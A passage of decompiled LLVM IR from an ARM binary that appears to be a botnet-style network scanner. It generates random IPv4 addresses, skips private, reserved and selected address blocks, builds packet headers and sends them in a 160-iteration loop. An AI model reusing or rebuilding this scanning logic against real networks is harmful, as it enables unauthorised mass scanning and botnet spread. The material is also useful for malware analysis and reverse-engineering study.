  %stack_var_-1872.0 = phi i32 [ %tmp239, %dec_label_pc_10a68 ], [ %stack_var_-1872.2, %dec_label_pc_11568 ]
  %stack_var_-1884.0 = phi i8* [ %tmp277, %dec_label_pc_10a68 ], [ %stack_var_-1884.1, %dec_label_pc_11568 ]
  %v0_11240 = phi i32 [ %v2_10f00, %dec_label_pc_10a68 ], [ %stack_var_-1880.1, %dec_label_pc_11568 ]
  %stack_var_-1876.0 = phi i8 [ %v5_10a50.le, %dec_label_pc_10a68 ], [ %stack_var_-1876.1, %dec_label_pc_11568 ]
  store i32 ptrtoint (i32* @global_var_1ec34.185 to i32), i32* %r2.global-to-local, align 4
  store i32 %stack_var_-1872.0, i32* %r3.global-to-local, align 4
  %v2_10f18 = load i32, i32* @global_var_1ec34.185, align 4
  store i32 %v2_10f18, i32* @r8, align 4
  %v3_10f1c = icmp uge i32 %stack_var_-1872.0, %v2_10f18
  store i1 %v3_10f1c, i1* %cpsr_c.global-to-local, align 1
  %v9_10f1c = icmp eq i32 %stack_var_-1872.0, %v2_10f18
  store i1 %v9_10f1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10f1c, label %dec_label_pc_111c8, label %dec_label_pc_10f24

dec_label_pc_10f24:                               ; preds = %dec_label_pc_10f10
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  %v2_11198 = ptrtoint i32* %stack_var_-92 to i32
  br label %dec_label_pc_10f30

dec_label_pc_10f30:                               ; preds = %.thread47.dec_label_pc_10f30_crit_edge, %dec_label_pc_10f24
  %v0_10f30 = phi i32 [ %v0_10f30.pre, %.thread47.dec_label_pc_10f30_crit_edge ], [ 0, %dec_label_pc_10f24 ]
  store i32 %v0_10f30, i32* %stack_var_-92, align 4
  store i32 %v0_10f30, i32* %stack_var_-84, align 4
  %v0_10f40 = call i32 @function_fe60()
  %v1_10f40 = trunc i32 %v0_10f40 to i8
  store i32 %v0_10f40, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ec7c.86 to i32), i32* %lr.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_1ec04.201 to i32), i32* %r1.global-to-local, align 4
  %v2_10f4c = load i32, i32* @global_var_1ec7c.86, align 4
  store i32 %v2_10f4c, i32* %r2.global-to-local, align 4
  %v2_10f50 = and i32 %v0_10f40, 128
  %v3_10f50 = icmp ne i32 %v2_10f50, 0
  store i1 %v3_10f50, i1* %cpsr_c.global-to-local, align 1
  %v4_10f50 = sdiv i32 %v0_10f40, 256
  store i32 %v4_10f50, i32* %r3.global-to-local, align 4
  %v1_10f54 = trunc i32 %v4_10f50 to i8
  store i8 %v1_10f54, i8* bitcast (i32* @global_var_1ec09.208 to i8*), align 4
  store i32 %v2_10f4c, i32* @global_var_1ec10.313, align 4
  store i8 %v1_10f40, i8* bitcast (i32* @global_var_1ec08.212 to i8*), align 4
  br label %dec_label_pc_10f60

dec_label_pc_10f60:                               ; preds = %dec_label_pc_11034, %dec_label_pc_10f90, %dec_label_pc_11068, %dec_label_pc_1105c, %dec_label_pc_11050, %dec_label_pc_11044, %.thread32, %bb296, %bb295, %bb294, %bb293, %bb292, %dec_label_pc_1102c, %dec_label_pc_11024, %bb288, %dec_label_pc_10ff4, %dec_label_pc_10fd0, %bb281, %dec_label_pc_10fa0, %bb280, %dec_label_pc_10f88, %bb279, %bb298, %dec_label_pc_10f30
  %v0_10f60 = call i32 @function_fe60()
  store i32 %v0_10f60, i32* %r0.global-to-local, align 4
  %v1_10f64 = urem i32 %v0_10f60, 256
  store i32 %v1_10f64, i32* %r1.global-to-local, align 4
  %v3_10f68 = udiv i32 %v0_10f60, 256
  store i32 %v3_10f68, i32* %r3.global-to-local, align 4
  %v3_10f6c = udiv i32 %v0_10f60, 65536
  store i32 %v3_10f6c, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10f70 = icmp eq i32 %v1_10f64, 0
  store i1 %v2_10f70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10f70, label %bb279, label %bb278

bb278:                                            ; preds = %dec_label_pc_10f60
  %v3_10f74 = icmp ugt i32 %v1_10f64, 126
  store i1 %v3_10f74, i1* %cpsr_c.global-to-local, align 1
  %v8_10f74 = icmp eq i32 %v1_10f64, 127
  store i1 %v8_10f74, i1* %cpsr_z.global-to-local, align 1
  br label %bb279

bb279:                                            ; preds = %dec_label_pc_10f60, %bb278
  %v0_10f84 = phi i1 [ true, %dec_label_pc_10f60 ], [ %v8_10f74, %bb278 ]
  %v1_10f78 = urem i32 %v3_10f68, 256
  store i32 %v1_10f78, i32* %ip.global-to-local, align 4
  %v1_10f7c = urem i32 %v3_10f6c, 256
  store i32 %v1_10f7c, i32* %r2.global-to-local, align 4
  %v1_10f80 = and i32 %v0_10f60, 8388608
  %v2_10f80 = icmp ne i32 %v1_10f80, 0
  store i1 %v2_10f80, i1* %cpsr_c.global-to-local, align 1
  %v3_10f80 = udiv i32 %v0_10f60, 16777216
  store i32 %v3_10f80, i32* %r0.global-to-local, align 4
  br i1 %v0_10f84, label %dec_label_pc_10f60, label %dec_label_pc_10f88

dec_label_pc_10f88:                               ; preds = %bb279
  %v2_10f88 = icmp ugt i32 %v1_10f64, 2
  store i1 %v2_10f88, i1* %cpsr_c.global-to-local, align 1
  %v7_10f88 = icmp eq i32 %v1_10f64, 3
  store i1 %v7_10f88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f88, label %dec_label_pc_10f60, label %dec_label_pc_10f90

dec_label_pc_10f90:                               ; preds = %dec_label_pc_10f88
  %v1_10f90 = add nsw i32 %v1_10f64, -15
  store i32 %v1_10f90, i32* %r3.global-to-local, align 4
  %v2_10f94 = icmp ugt i32 %v1_10f64, 55
  store i1 %v2_10f94, i1* %cpsr_c.global-to-local, align 1
  %v7_10f94 = icmp eq i32 %v1_10f64, 56
  store i1 %v7_10f94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f94, label %dec_label_pc_10f60, label %bb280

bb280:                                            ; preds = %dec_label_pc_10f90
  %v3_10f98 = icmp ne i32 %v1_10f90, 0
  store i1 %v3_10f98, i1* %cpsr_c.global-to-local, align 1
  %v8_10f98 = icmp eq i32 %v1_10f90, 1
  store i1 %v8_10f98, i1* %cpsr_z.global-to-local, align 1
  %v2_10f9c = xor i1 %v3_10f98, true
  %v3_10f9c = or i1 %v8_10f98, %v2_10f9c
  br i1 %v3_10f9c, label %dec_label_pc_10f60, label %dec_label_pc_10fa0

dec_label_pc_10fa0:                               ; preds = %bb280
  %v2_10fa0 = icmp ugt i32 %v1_10f64, 9
  store i1 %v2_10fa0, i1* %cpsr_c.global-to-local, align 1
  %v7_10fa0 = icmp eq i32 %v1_10f64, 10
  store i1 %v7_10fa0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10fa0, label %dec_label_pc_10f60, label %dec_label_pc_10fa8

dec_label_pc_10fa8:                               ; preds = %dec_label_pc_10fa0
  %v2_10fa8 = icmp ugt i32 %v1_10f64, 191
  store i1 %v2_10fa8, i1* %cpsr_c.global-to-local, align 1
  %v7_10fa8 = icmp eq i32 %v1_10f64, 192
  store i1 %v7_10fa8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10fa8, label %bb281, label %dec_label_pc_10fb4

bb281:                                            ; preds = %dec_label_pc_10fa8
  %v3_10fac = icmp ugt i32 %v1_10f78, 167
  store i1 %v3_10fac, i1* %cpsr_c.global-to-local, align 1
  %v8_10fac = icmp eq i32 %v1_10f78, 168
  store i1 %v8_10fac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10fac, label %dec_label_pc_10f60, label %dec_label_pc_10fb4

dec_label_pc_10fb4:                               ; preds = %dec_label_pc_10fa8, %bb281
  %v7_10fb4 = icmp eq i32 %v1_10f64, 172
  %.345 = zext i1 %v7_10fb4 to i32
  store i32 %.345, i32* %r3.global-to-local, align 4
  %v2_10fc0 = icmp ugt i32 %v1_10f78, 14
  store i1 %v2_10fc0, i1* %cpsr_c.global-to-local, align 1
  %v7_10fc0 = icmp eq i32 %v1_10f78, 15
  store i1 %v7_10fc0, i1* %cpsr_z.global-to-local, align 1
  %v2_10fc4 = xor i1 %v2_10fc0, true
  %v3_10fc4 = or i1 %v7_10fc0, %v2_10fc4
  br i1 %v3_10fc4, label %.thread10, label %bb284

.thread10:                                        ; preds = %dec_label_pc_10fb4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10fd8

bb284:                                            ; preds = %dec_label_pc_10fb4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10fc8 = icmp eq i1 %v7_10fb4, false
  store i1 %v2_10fc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10fc8, label %dec_label_pc_10fd8, label %dec_label_pc_10fd0

dec_label_pc_10fd0:                               ; preds = %bb284
  %v2_10fd0 = icmp ugt i32 %v1_10f78, 30
  store i1 %v2_10fd0, i1* %cpsr_c.global-to-local, align 1
  %v7_10fd0 = icmp eq i32 %v1_10f78, 31
  store i1 %v7_10fd0, i1* %cpsr_z.global-to-local, align 1
  %v2_10fd4 = xor i1 %v2_10fd0, true
  %v3_10fd4 = or i1 %v7_10fd0, %v2_10fd4
  br i1 %v3_10fd4, label %dec_label_pc_10f60, label %dec_label_pc_10fd8

dec_label_pc_10fd8:                               ; preds = %.thread10, %dec_label_pc_10fd0, %bb284
  %v7_10fd8 = icmp eq i32 %v1_10f64, 100
  %.346 = zext i1 %v7_10fd8 to i32
  store i32 %.346, i32* %r3.global-to-local, align 4
  %v2_10fe4 = icmp ugt i32 %v1_10f78, 62
  store i1 %v2_10fe4, i1* %cpsr_c.global-to-local, align 1
  %v7_10fe4 = icmp eq i32 %v1_10f78, 63
  store i1 %v7_10fe4, i1* %cpsr_z.global-to-local, align 1
  %v2_10fe8 = xor i1 %v2_10fe4, true
  %v3_10fe8 = or i1 %v7_10fe4, %v2_10fe8
  br i1 %v3_10fe8, label %.thread15, label %bb287

.thread15:                                        ; preds = %dec_label_pc_10fd8
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10ffc

bb287:                                            ; preds = %dec_label_pc_10fd8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10fec = icmp eq i1 %v7_10fd8, false
  store i1 %v2_10fec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10fec, label %dec_label_pc_10ffc, label %dec_label_pc_10ff4

dec_label_pc_10ff4:                               ; preds = %bb287
  %v2_10ff4 = icmp ugt i32 %v1_10f78, 125
  store i1 %v2_10ff4, i1* %cpsr_c.global-to-local, align 1
  %v7_10ff4 = icmp eq i32 %v1_10f78, 126
  store i1 %v7_10ff4, i1* %cpsr_z.global-to-local, align 1
  %v2_10ff8 = xor i1 %v2_10ff4, true
  %v3_10ff8 = or i1 %v7_10ff4, %v2_10ff8
  br i1 %v3_10ff8, label %dec_label_pc_10f60, label %dec_label_pc_10ffc

dec_label_pc_10ffc:                               ; preds = %.thread15, %dec_label_pc_10ff4, %bb287
  %v2_10ffc = icmp ugt i32 %v1_10f64, 168
  store i1 %v2_10ffc, i1* %cpsr_c.global-to-local, align 1
  %v7_10ffc = icmp eq i32 %v1_10f64, 169
  store i1 %v7_10ffc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10ffc, label %bb288, label %dec_label_pc_11008

bb288:                                            ; preds = %dec_label_pc_10ffc
  %v3_11000 = icmp eq i32 %v1_10f78, 255
  store i1 %v3_11000, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_11000, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_11000, label %dec_label_pc_10f60, label %dec_label_pc_11008

dec_label_pc_11008:                               ; preds = %dec_label_pc_10ffc, %bb288
  %v7_11008 = icmp eq i32 %v1_10f64, 198
  %.347 = zext i1 %v7_11008 to i32
  store i32 %.347, i32* %r3.global-to-local, align 4
  %v2_11014 = icmp ugt i32 %v1_10f78, 16
  store i1 %v2_11014, i1* %cpsr_c.global-to-local, align 1
  %v7_11014 = icmp eq i32 %v1_10f78, 17
  store i1 %v7_11014, i1* %cpsr_z.global-to-local, align 1
  %v2_11018 = xor i1 %v2_11014, true
  %v3_11018 = or i1 %v7_11014, %v2_11018
  br i1 %v3_11018, label %.thread21, label %bb291

.thread21:                                        ; preds = %dec_label_pc_11008
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1102c

bb291:                                            ; preds = %dec_label_pc_11008
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1101c = icmp eq i1 %v7_11008, false
  store i1 %v2_1101c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1101c, label %dec_label_pc_1102c, label %dec_label_pc_11024

dec_label_pc_11024:                               ; preds = %bb291
  %v2_11024 = icmp ugt i32 %v1_10f78, 18
  store i1 %v2_11024, i1* %cpsr_c.global-to-local, align 1
  %v7_11024 = icmp eq i32 %v1_10f78, 19
  store i1 %v7_11024, i1* %cpsr_z.global-to-local, align 1
  %v2_11028 = xor i1 %v2_11024, true
  %v3_11028 = or i1 %v7_11024, %v2_11028
  br i1 %v3_11028, label %dec_label_pc_10f60, label %dec_label_pc_1102c

dec_label_pc_1102c:                               ; preds = %.thread21, %dec_label_pc_11024, %bb291
  %v2_1102c = icmp ugt i32 %v1_10f64, 222
  store i1 %v2_1102c, i1* %cpsr_c.global-to-local, align 1
  %v7_1102c = icmp eq i32 %v1_10f64, 223
  store i1 %v7_1102c, i1* %cpsr_z.global-to-local, align 1
  %v2_11030 = xor i1 %v7_1102c, true
  %v3_11030 = and i1 %v2_1102c, %v2_11030
  br i1 %v3_11030, label %dec_label_pc_10f60, label %dec_label_pc_11034

dec_label_pc_11034:                               ; preds = %dec_label_pc_1102c
  %v1_11034 = add nsw i32 %v1_10f64, -6
  store i32 %v1_11034, i32* %r3.global-to-local, align 4
  %v2_11038 = icmp ugt i32 %v1_10f64, 10
  store i1 %v2_11038, i1* %cpsr_c.global-to-local, align 1
  %v7_11038 = icmp eq i32 %v1_10f64, 11
  store i1 %v7_11038, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11038, label %dec_label_pc_10f60, label %bb292

bb292:                                            ; preds = %dec_label_pc_11034
  %v3_1103c = icmp ne i32 %v1_11034, 0
  store i1 %v3_1103c, i1* %cpsr_c.global-to-local, align 1
  %v8_1103c = icmp eq i32 %v1_11034, 1
  store i1 %v8_1103c, i1* %cpsr_z.global-to-local, align 1
  %v2_11040 = xor i1 %v3_1103c, true
  %v3_11040 = or i1 %v8_1103c, %v2_11040
  br i1 %v3_11040, label %dec_label_pc_10f60, label %dec_label_pc_11044

dec_label_pc_11044:                               ; preds = %bb292
  %v2_11044 = icmp ugt i32 %v1_10f64, 21
  store i1 %v2_11044, i1* %cpsr_c.global-to-local, align 1
  %v7_11044 = icmp eq i32 %v1_10f64, 22
  store i1 %v7_11044, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11044, label %dec_label_pc_10f60, label %bb293

bb293:                                            ; preds = %dec_label_pc_11044
  %v3_11048 = icmp ugt i32 %v1_10f64, 20
  store i1 %v3_11048, i1* %cpsr_c.global-to-local, align 1
  %v8_11048 = icmp eq i32 %v1_10f64, 21
  store i1 %v8_11048, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11048, label %dec_label_pc_10f60, label %dec_label_pc_11050

dec_label_pc_11050:                               ; preds = %bb293
  %v2_11050 = icmp ugt i32 %v1_10f64, 27
  store i1 %v2_11050, i1* %cpsr_c.global-to-local, align 1
  %v7_11050 = icmp eq i32 %v1_10f64, 28
  store i1 %v7_11050, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11050, label %dec_label_pc_10f60, label %bb294

bb294:                                            ; preds = %dec_label_pc_11050
  %v3_11054 = icmp ugt i32 %v1_10f64, 25
  store i1 %v3_11054, i1* %cpsr_c.global-to-local, align 1
  %v8_11054 = icmp eq i32 %v1_10f64, 26
  store i1 %v8_11054, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11054, label %dec_label_pc_10f60, label %dec_label_pc_1105c

dec_label_pc_1105c:                               ; preds = %bb294
  %v2_1105c = icmp ugt i32 %v1_10f64, 29
  store i1 %v2_1105c, i1* %cpsr_c.global-to-local, align 1
  %v7_1105c = icmp eq i32 %v1_10f64, 30
  store i1 %v7_1105c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1105c, label %dec_label_pc_10f60, label %bb295

bb295:                                            ; preds = %dec_label_pc_1105c
  %v3_11060 = icmp ugt i32 %v1_10f64, 28
  store i1 %v3_11060, i1* %cpsr_c.global-to-local, align 1
  %v8_11060 = icmp eq i32 %v1_10f64, 29
  store i1 %v8_11060, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11060, label %dec_label_pc_10f60, label %dec_label_pc_11068

dec_label_pc_11068:                               ; preds = %bb295
  %v2_11068 = icmp ugt i32 %v1_10f64, 54
  store i1 %v2_11068, i1* %cpsr_c.global-to-local, align 1
  %v7_11068 = icmp eq i32 %v1_10f64, 55
  store i1 %v7_11068, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11068, label %dec_label_pc_10f60, label %bb296

bb296:                                            ; preds = %dec_label_pc_11068
  %v3_1106c = icmp ugt i32 %v1_10f64, 32
  store i1 %v3_1106c, i1* %cpsr_c.global-to-local, align 1
  %v8_1106c = icmp eq i32 %v1_10f64, 33
  store i1 %v8_1106c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1106c, label %dec_label_pc_10f60, label %dec_label_pc_11074

dec_label_pc_11074:                               ; preds = %bb296
  %v2_11074 = icmp ugt i32 %v1_10f64, 214
  store i1 %v2_11074, i1* %cpsr_c.global-to-local, align 1
  %v7_11074 = icmp eq i32 %v1_10f64, 215
  store i1 %v7_11074, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11074, label %.thread32, label %bb297

bb297:                                            ; preds = %dec_label_pc_11074
  %v3_11078 = icmp ugt i32 %v1_10f64, 213
  store i1 %v3_11078, i1* %cpsr_c.global-to-local, align 1
  %v8_11078 = icmp eq i32 %v1_10f64, 214
  store i1 %v8_11078, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11078, label %bb298, label %dec_label_pc_11088

.thread32:                                        ; preds = %dec_label_pc_11074
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10f60

bb298:                                            ; preds = %bb297
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10f60

dec_label_pc_11088:                               ; preds = %bb297
  store i32 0, i32* @r4, align 4
  %v5_11094 = call i32 @llvm.bswap.i32(i32 %v0_10f60)
  store i32 %v5_11094, i32* %r3.global-to-local, align 4
  %tmp299 = and i32 %v0_10f60, 65280
  %tmp300 = call i32 @llvm.bswap.i32(i32 %tmp299)
  %v1_1109c = and i32 %v5_11094, ptrtoint (i32* @global_var_ff00.24 to i32)
  %v3_110a0 = mul nuw i32 %v3_10f80, 16777216
  %v3_110a4 = udiv i32 %tmp300, 256
  %v4_110a8 = mul i32 %v1_1109c, 256
  %tmp301 = and i32 %v0_10f60, 32768
  %v3_110ac = icmp ne i32 %tmp301, 0
  store i1 %v3_110ac, i1* %cpsr_c.global-to-local, align 1
  %v4_110ac = udiv i32 %v5_11094, 16777216
  store i32 ptrtoint (i8** @global_var_1ec04.201 to i32), i32* @r0, align 4
  %v5_110ac = or i32 %v4_110ac, %v3_110a0
  %v5_110a8 = or i32 %v5_110ac, %v4_110a8
  %v2_110b4 = or i32 %v5_110a8, %v3_110a4
  store i32 %v2_110b4, i32* %r2.global-to-local, align 4
  %v5_110b8 = trunc i32 %v4_110ac to i8
  store i8 %v5_110b8, i8* @global_var_1ec14.314, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  store i8 0, i8* bitcast (i32* @global_var_1ec0e.315 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_1ec0f.316 to i8*), align 4
  %v3_110c8 = call i32 @function_e424(i32 ptrtoint (i8** @global_var_1ec04.201 to i32), i32 20)
  store i32 ptrtoint (i8** @global_var_1ec04.201 to i32), i32* %ip.global-to-local, align 4
  %sext6 = mul i32 %v3_110c8, 16777216
  %v1_110d0 = sdiv i32 %sext6, 16777216
  store i32 %v1_110d0, i32* %r3.global-to-local, align 4
  %v2_110d4 = and i32 %v1_110d0, 128
  %v3_110d4 = icmp ne i32 %v2_110d4, 0
  store i1 %v3_110d4, i1* %cpsr_c.global-to-local, align 1
  %v4_110d4 = ashr i32 %sext6, 31
  store i32 %v4_110d4, i32* %r2.global-to-local, align 4
  %v1_110d8 = trunc i32 %v1_110d0 to i8
  store i8 %v1_110d8, i8* bitcast (i32* @global_var_1ec0e.315 to i8*), align 4
  %v1_110dc = trunc i32 %v4_110d4 to i8
  store i8 %v1_110dc, i8* bitcast (i32* @global_var_1ec0f.316 to i8*), align 4
  %v3_110e0 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_110e0, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_110e8 = call i32 @function_1347c(i32 %v3_110e0, i32 10)
  store i32 %v2_110e8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_110ec = icmp eq i32 %v2_110e8, 0
  store i1 %v2_110ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_110ec, label %.thread198, label %bb302

.thread198:                                       ; preds = %dec_label_pc_11088
  store i32 ptrtoint (i32* @global_var_1ec18.205 to i32), i32* @lr, align 4
  br label %.thread42.thread73

bb302:                                            ; preds = %dec_label_pc_11088
  store i32 ptrtoint (i32* @global_var_1ec18.205 to i32), i32* %r0.global-to-local, align 4
  store i32 23, i32* %r3.global-to-local, align 4
  %v1_110fc = load i32, i32* @r4, align 4
  %v2_110fc = trunc i32 %v1_110fc to i8
  store i8 %v2_110fc, i8* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1ec18.205 to i32), i32 2) to i8*), align 2
  %v0_11100.pr.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11100.pr.pre, label %.thread42.thread73, label %.thread39

.thread39:                                        ; preds = %bb302
  %v1_11100 = load i32, i32* %r3.global-to-local, align 4
  %v2_11100 = trunc i32 %v1_11100 to i8
  %v3_11100 = load i32, i32* %r0.global-to-local, align 4
  %v4_11100 = add i32 %v3_11100, 3
  %v5_11100 = inttoptr i32 %v4_11100 to i8*
  store i8 %v2_11100, i8* %v5_11100, align 1
  %v0_11108.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i8** @global_var_1ec04.201 to i32), i32* %r0.global-to-local, align 4
  br i1 %v0_11108.pr.pr, label %.thread45, label %.thread47

.thread42.thread73:                               ; preds = %bb302, %.thread198
  store i32 ptrtoint (i8** @global_var_1ec04.201 to i32), i32* %r0.global-to-local, align 4
  br label %.thread45

.thread45:                                        ; preds = %.thread39, %.thread42.thread73
  store i32 9, i32* %r3.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  %v3_11110 = load i32, i32* @lr, align 4
  %v4_11110 = add i32 %v3_11110, 2
  %v5_11110 = inttoptr i32 %v4_11110 to i8*
  store i8 9, i8* %v5_11110, align 1
  %v0_11114.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11114.pr.pr, label %bb303, label %.thread47

bb303:                                            ; preds = %.thread45
  %v1_11114 = load i32, i32* %r2.global-to-local, align 4
  %v2_11114 = trunc i32 %v1_11114 to i8
  %v3_11114 = load i32, i32* @lr, align 4
  %v4_11114 = add i32 %v3_11114, 3
  %v5_11114 = inttoptr i32 %v4_11114 to i8*
  store i8 %v2_11114, i8* %v5_11114, align 1
  br label %.thread47

.thread47:                                        ; preds = %.thread39, %.thread45, %bb303
  %v4_11118 = load i8, i8* @global_var_1ec14.314, align 1
  %v5_11118 = sext i8 %v4_11118 to i32
  store i32 %v5_11118, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ec18.205 to i32), i32* %lr.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ec18.205 to i32), i32* @r1, align 4
  store i8 %v4_11118, i8* @global_var_1ec1c.317, align 4
  store i32 5120, i32* %r2.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v0_11130 = load i32, i32* %sl.global-to-local, align 4
  %v1_11130 = trunc i32 %v0_11130 to i8
  store i8 %v1_11130, i8* bitcast (i32* @global_var_1ec28.318 to i8*), align 4
  store i8 %v1_11130, i8* bitcast (i32* @global_var_1ec29.319 to i8*), align 4
  %v5_11138 = call i32 @function_e480(i32 ptrtoint (i8** @global_var_1ec04.201 to i32), i32 ptrtoint (i32* @global_var_1ec18.205 to i32), i32 5120, i32 20)
  %sext = mul i32 %v5_11138, 16777216
  %v1_11140 = sdiv i32 %sext, 16777216
  %v3_11148 = ashr i32 %sext, 31
  %v2_1114c = load i32, i32* @global_var_1ec18.205, align 4
  %v1_11154 = trunc i32 %v3_11148 to i8
  store i8 %v1_11154, i8* bitcast (i32* @global_var_1ec29.319 to i8*), align 4
  store i32 2, i32* %stack_var_-92, align 4
  %v3_11168 = load i8, i8* @global_var_1ec14.314, align 1
  %v4_11168 = sext i8 %v3_11168 to i32
  store i32 %v4_11168, i32* @r4, align 4
  %v2_1116c = load i32, i32* @global_var_1ec9c.199, align 4
  store i32 %v2_1116c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ec18.205 to i32), i32* %ip.global-to-local, align 4
  %v1_1117c = and i32 %v2_1114c, 8388608
  %v2_1117c = icmp ne i32 %v1_1117c, 0
  store i1 %v2_1117c, i1* %cpsr_c.global-to-local, align 1
  %v1_11184 = trunc i32 %v1_11140 to i8
  store i8 %v1_11184, i8* bitcast (i32* @global_var_1ec28.318 to i8*), align 4
  store i32 ptrtoint (i8** @global_var_1ec04.201 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v2_11198, i32* %lr.global-to-local, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v8_111ac = call i32 @function_13eec(i32 %v2_1116c, i32* bitcast (i8** @global_var_1ec04.201 to i32*), i32 40, i32 16384, i32 %v2_11198, i32 16)
  store i32 %v8_111ac, i32* %r0.global-to-local, align 4
  %v3_111b0 = load i32, i32* %stack_var_-52, align 4
  %v1_111b4 = add i32 %v3_111b0, 1
  store i32 %v1_111b4, i32* %r3.global-to-local, align 4
  %v2_111b8 = icmp ugt i32 %v1_111b4, 158
  store i1 %v2_111b8, i1* %cpsr_c.global-to-local, align 1
  %v7_111b8 = icmp eq i32 %v1_111b4, 159
  store i1 %v7_111b8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_111b4, i32* %stack_var_-52, align 4
  %v7_111c0 = icmp slt i32 %v1_111b4, 160
  br i1 %v7_111c0, label %.thread47.dec_label_pc_10f30_crit_edge, label %dec_label_pc_111c4

.thread47.dec_label_pc_10f30_crit_edge:           ; preds = %.thread47
  %v0_10f30.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_10f30

dec_label_pc_111c4:                               ; preds = %.thread47
  %v0_111c4 = load i32, i32* @r8, align 4
  br label %dec_label_pc_111c8

dec_label_pc_111c8:                               ; preds = %dec_label_pc_10f10, %dec_label_pc_111c4
  %stack_var_-1872.1 = phi i32 [ %stack_var_-1872.0, %dec_label_pc_10f10 ], [ %v0_111c4, %dec_label_pc_111c4 ]
  %v0_111c8 = call i32 @function_13c28()
  store i32 %v0_111c8, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v2_111dc = inttoptr i32 %v0_111c8 to i32*
  %v6_11204 = inttoptr i32 %v0_11240 to i32*
  %v1_11230 = add i32 %v0_11240, 16
  %v2_11230 = inttoptr i32 %v1_11230 to i32*
  %v4_1124c = ptrtoint i8* %stack_var_-1884.0 to i32
  %v1_11254 = add i32 %v4_1124c, 1
  %v2_11254 = inttoptr i32 %v1_11254 to i8*
  %v1_11278 = add i32 %v4_1124c, 2
  %v2_11278 = inttoptr i32 %v1_11278 to i8*
  %v1_1127c = add i32 %v4_1124c, 3
  %v2_1127c = inttoptr i32 %v1_1127c to i8*
  %v4_11280 = sext i8 %stack_var_-1876.0 to i32
  %v1_1135c = bitcast i8* %stack_var_-1884.0 to i32*
  %v1_11240 = add i32 %v0_11240, 9
  %v2_11240 = inttoptr i32 %v1_11240 to i8*
  %v1_11290 = add i32 %v4_1124c, 13
  %v2_11290 = inttoptr i32 %v1_11290 to i8*
  %v1_112b4 = add i32 %v4_1124c, 8
  %v2_112b4 = inttoptr i32 %v1_112b4 to i32*
  %v1_112f4 = add i32 %v0_11240, 12
  %v2_112f4 = inttoptr i32 %v1_112f4 to i32*
  br label %dec_label_pc_111d4

dec_label_pc_111d4:                               ; preds = %dec_label_pc_112b4, %dec_label_pc_112ac, %dec_label_pc_112a4, %dec_label_pc_11274, %dec_label_pc_11264, %dec_label_pc_11240, %dec_label_pc_11228, %dec_label_pc_1129c, %dec_label_pc_11290, %dec_label_pc_11220, %dec_label_pc_11354, %dec_label_pc_111c8
  store i32 0, i32* %v2_111dc, align 4
  %v2_111e4 = load i32, i32* @global_var_1ec9c.199, align 4
